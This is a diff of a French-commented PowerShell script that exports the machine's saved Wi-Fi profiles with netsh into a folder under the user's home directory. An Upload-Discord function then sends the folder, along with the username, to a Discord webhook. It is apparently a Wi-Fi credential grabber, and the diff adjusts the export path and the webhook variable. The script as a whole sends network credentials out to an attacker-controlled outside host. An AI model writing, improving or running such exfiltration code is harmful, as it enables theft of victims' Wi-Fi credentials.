@@ -1,6 +1,7 @@
-# Créer le répertoire xml et exporter le profil wlan
-mkdir xml
-netsh wlan export profile folder=xml
+# Créer le répertoire xml dans le répertoire personnel de l'utilisateur et exporter le profil wlan
+$xmlPath = Join-Path $env:USERPROFILE "xml"
+mkdir $xmlPath
+netsh wlan export profile folder=$xmlPath
 
 # Définir la fonction Upload-Discord
 function Upload-Discord {
@@ -13,7 +14,7 @@ function Upload-Discord {
         [string]$text
     )
 
-    $hookurl = "$dc"
+    $hookurl = "dc"
 
     $Body = @{
       'username' = $env:username
@@ -33,4 +34,4 @@ function Upload-Discord {
 }
 
 # Appeler la fonction Upload-Discord avec le chemin du dossier xml
-Upload-Discord -folder "C:\Users\OMEN1\xml"
+Upload-Discord -folder $xmlPath
